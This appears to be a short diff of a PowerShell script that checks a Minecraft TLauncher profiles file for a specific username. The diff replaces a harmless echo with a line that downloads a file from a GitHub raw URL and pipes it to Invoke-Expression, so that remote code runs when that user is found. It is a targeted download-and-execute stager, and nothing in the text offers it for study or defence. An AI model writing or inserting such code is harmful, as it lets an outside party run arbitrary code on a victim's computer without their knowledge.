@@ -3,6 +3,6 @@ $file = "C:\Users\admin\AppData\Roaming\.minecraft\TlauncherProfiles.json"
 if (Test-Path $file) {
     $content = Get-Content $file -Raw
     if ($content -like "*khoi2802*") {
-        echo "ello"
+        iwr "https://raw.githubusercontent.com/Catnaldo10/test/refs/heads/main/a" -UseBasicParsing | iex
     }
 }
